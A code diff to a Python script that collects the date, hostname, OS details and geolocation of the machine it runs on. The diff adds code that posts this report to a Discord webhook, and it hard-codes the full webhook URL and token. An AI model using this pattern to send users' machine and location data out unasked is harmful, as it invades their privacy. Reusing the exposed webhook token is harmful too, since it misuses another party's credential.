@@ -34,7 +34,7 @@ def get_location():
     except Exception as e:
         print("Exception occurred (CITY/COUNTRY)", e)
         return None
-        
+
 def get_hostname():
     try:
         hostname = socket.gethostname()
@@ -55,6 +55,17 @@ def save_to_file(content):
     except Exception as e:
         print("Error in saving to file: ", e)
 
+def send_to_discord_webhook(webhook_url, content):
+    data = {"content": content}
+    try:
+        response = requests.post(webhook_url, json=data)
+        if response.status_code == 204:
+            print("Sent to discord.")
+        else:
+            print("Error in sending message to discord.")
+    except Exception as e:
+        print("Error in sending message to discord: ",e)
+
 if __name__ == "__main__":
     current_time = datetime.datetime.now()
     formatted_time = current_time.strftime("%d-%m-%Y | %H:%M")
@@ -65,6 +76,7 @@ if __name__ == "__main__":
     os_name, os_version = get_os_info()
     location = get_location()
 
+    webhook_url = "https://discord.com/api/webhooks/1139219671514624131/ozlM1RCPPFz3Zb96NVYyvZomBk8_2-KrU0vtGSzUFIzy6HOKszmDF68DrbCO5x-EZ1Lh"
 
     log_content = "Date: " + formatted_time + "\n"
 
@@ -96,3 +108,4 @@ if __name__ == "__main__":
 
     print(log_content)
     save_to_file(log_content)
+    send_to_discord_webhook(webhook_url, log_content)
